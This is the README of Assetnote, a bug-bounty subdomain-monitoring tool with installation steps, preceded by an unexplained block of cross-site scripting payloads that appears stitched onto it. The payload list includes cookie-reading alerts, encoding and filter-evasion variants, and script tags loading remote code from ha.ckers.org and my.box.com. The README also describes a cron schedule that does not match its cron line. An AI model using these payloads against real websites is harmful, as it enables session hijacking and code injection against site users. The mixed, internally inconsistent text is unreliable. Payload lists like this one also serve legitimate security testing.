<img src=%00 onerror=alert(document.domain)
<script/src='

<img src=%00 onerror=alert(document.cookie)
<script/src='

<img src=%00 onerror=confirm(1337)
<script/src='

“>

‘; alert(2);
‘)alert(3);//


“>

‘; alert(4); ‘)alert(5);//

     
{font-family:'<iframe/onload=confirm(6)>'

<input/onmouseover="javaSCRIPT:confirm(7)"


<img/src=%00 onerror=this.onerror=confirm(8)

<img src=%00 onerror=alert(9)
<script/src='

http://www.google</a>&lt;script .com&gt;alert(document.location)&lt;/script</p> <p data-sourcepos="67:1-67:85">&lt;a href=[�]&quot;� onmouseover=prompt(1)//&quot;&gt;XYZ&lt;/a</p> <p data-sourcepos="69:1-69:46">&lt;img/src=@ onerror = prompt('11')</p> <p data-sourcepos="71:1-71:47">&lt;style/onload=prompt('XSS')</p> <script ^__^>alert(String.fromCharCode(49))</script ^__^ /***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/ X //style///>SPAN  http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(12) ">' OnMouseOver {Firefox & Opera}
^__^
X
{IE7}  http://ha.ckers.org/scriptlet.html> <IMG SRC=\"javascript:alert('XSS')\" <SCRIPT SRC=//ha.ckers.org/.js> <SCRIPT SRC=http://ha.ckers.org/xss.js?<B> <<SCRIPT>alert(\"XSS\");//<</SCRIPT> <SCRIPT/SRC=\"http://ha.ckers.org/xss.js\
"> http://ha.ckers.org/xss.js\"></SCRIPT> <IMG SRC=\" javascript:alert('XSS');\"> perl -e 'print \"<SCR\0IPT>alert(\\"XSS\\")</SCR\0IPT>\";' > out perl -e 'print \"<IMG SRC=java\0script:alert(\\"XSS\\")>\";' > out <IMG SRC=\"javascript:alert('XSS');\"> <IMG SRC=\"jav ascript:alert('XSS');\"> <IMG SRC=\"javascript:alert('XSS');\"> <IMG SRC=javascript:alert('XSS')> <IMG SRC=javascript:alert('XSS')> <IMG SRC=javascript:alert('XSS')> <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> <IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"> <IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`> <IMG SRC=javascript:alert("XSS")> <IMG SRC=JaVaScRiPt:alert('XSS')> <IMG SRC=javascript:alert('XSS')> <IMG SRC=\"javascript:alert('XSS');\"> <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> '';!--\"<XSS>=&{()} ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->">'> '';!--"=&{()}      ">  < \";alert('XSS');// ¼script¾alert(¢XSS¢)¼/script¾
@im\port'\ja\vasc\ript:alert("XSS")';  exp/* a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e); PT SRC="http://ha.ckers.org/xss.js"> TESTHTML5FORMACTION crosssitespt   <img src=" foo=">"> "> foo=">"> ;13 +ADw-script+AD4-alert(document.location)+ADw-/script+AD4- %2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4- +ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi- %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi- %253cscript%253ealert(document.cookie)%253c/script%253e “>alert(document.cookie) “> “>< foo ipt>alert(document.cookie)ipt> %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E ‘; alert(document.cookie); var foo=’ foo\’; alert(document.cookie);//’;   ">


# Assetnote

![logo](http://i.imgur.com/nY80uWj.png)

Assetnote notifies you of assets that have been found through scraping passive data stores. By using [Pushover's](https://pushover.net) push notification API, as soon as a new subdomain is found for an asset, a push notification is sent to your mobile phone (iOS/Android) with the data found.

For public release, I have included an example `manager` script for assetnote. This is Threatcrowd's public yet passive DNS data store. Assetnote can be extended very easily by writing scripts that interact with the `assetnote.db` SQLite database. The more scripts that have been made to scrape data sources, the more success one will have with this tool.

Assetnote was created mainly for bug bounties, to assist with finding bugs before others do. You get a push notification that a new subdomain has been put online, you're now probably one of the first people to know of this new asset. This means fewer duplicate findings and a higher success rate in finding security flaws in an organization.

## Screenshots

Login:

<img src="https://i.imgur.com/ZkwWrga.png" width="512">

Sent notifications:

<img src="https://i.imgur.com/R1ShMcG.png" width="512">

Adding assets:

<img src="https://i.imgur.com/xZWHiLB.png" width="512">

Push notification assets seen on the phone:

<img src="https://i.imgur.com/71SzMB4.png" width="256">

## Concepts

Assetnote is simply a web interface around the SQLite database `assetnote.db`. This database contains two columns, one that stores the domains that you'd like to monitor and another that stores every found subdomain through managers.

The core concept is that when a script within the `managers` folder finds a new subdomain, it is inserted as a domain in the `sent_notifications` column of the SQLite database. This ensures that you don't receive notifications of subdomains you already know about.

## Installation

The installation process is annoying - if I get bugged about this enough, I'll work on making it easier.

This is a full installation guide for a Debian server hosted on Digital Ocean. This should cover most people, even those with very basic devops knowlege.

1. Run the following commands to get a MySQL server installed:

```
sudo apt-get update
sudo apt-get install mysql-server
sudo mysql_secure_installation
sudo mysql_install_db
```

You'll have to provide a password to set up the MySQL server.

When running `mysql_secure_installation`, use the following answers:

```
Change the root password? [Y/n] n
 ... skipping.

 Remove anonymous users? [Y/n] y
 ... Success!

 Disallow root login remotely? [Y/n] y
 ... Success!

 Remove test database and access to it? [Y/n] Y
 - Dropping test database...

 Reload privilege tables now? [Y/n] Y
 ... Success!
```

2. Create a database for Assetnote on your MySQL server:

```
$ mysql -uroot -p

# login with your mysql user set up in step 1

# create the assetnote database

mysql> CREATE DATABASE assetnote;
Query OK, 1 row affected (0.00 sec)

# exit

mysql> exit;
Bye
```

2. Clone this git repo:

`git clone https://github.com/infosec-au/assetnote`

3. Create a new pushover application:

Visit https://pushover.net/login and sign up:

![signup](https://cms-assets.tutsplus.com/uploads/users/317/posts/22264/image/signup.jpg)

![pushovernewapp](https://cms-assets.tutsplus.com/uploads/users/317/posts/22264/image/new-app.jpg)

4. Modify the following files:

- `config.py`

```
SECRET_KEY = 'CHANGEME'
SQLALCHEMY_DATABASE_URI = 'mysql://root:test@localhost:3389/assetnote'
SECURITY_PASSWORD_SALT = 'CHANGEME'
PUSHOVER_KEY = 'PUSHOVERKEY'
```

Change the above configuration to have random, hard to guess secret keys/salts. Change the database credentials as needed.

Put your pushover's application key in `PUSHOVER_KEY`.

- `assetnote.py`

Line 21: Modify this to use your database credentials instead

```
engine = sqlalchemy.create_engine('mysql://root:testing@localhost:3389/assetnote')
```

Line 59: Change the username and password that will be used to login to assetnote

```
user_datastore.create_user(email='shubs', password='testing')
```

5. Get pip:

`apt-get install python-pip`

6. Install the required headers for MySQL-python and install python-bcrypt:

`apt-get install python-dev libmysqlclient-dev`
`apt-get install python-bcrypt`

7. Install the required modules:

When your user is currently in the assetnote directory, run - `pip install -r requirements.txt`

8. Update your crontab to run your assetnote managers every 30 minutes:

`crontab -e`

`*/11 * * * * /usr/bin/timeout 30m python /home/deploy/assetnote/managers/threatcrowd.py > /home/deploy/tc_log.txt 2>&1`

This will run the script every 30 minutes and with a timeout of 30 minutes. Modify the path's as needed.

## Support / help

Contact me via Twitter if any help is needed [@infosec_au](https://twitter.com/infosec_au).

## Release details

![BSides Canberra](https://i.imgur.com/SDnAepz.png)

[bsidesau.com.au](http://bsidesau.com.au)

This was released at BSides Canberra by [@infosec_au](https://twitter.com/infosec_au) and [@nnwakelam](https://twitter.com/nnwakelam) for the talk "Scrutiny on the bug bounty".
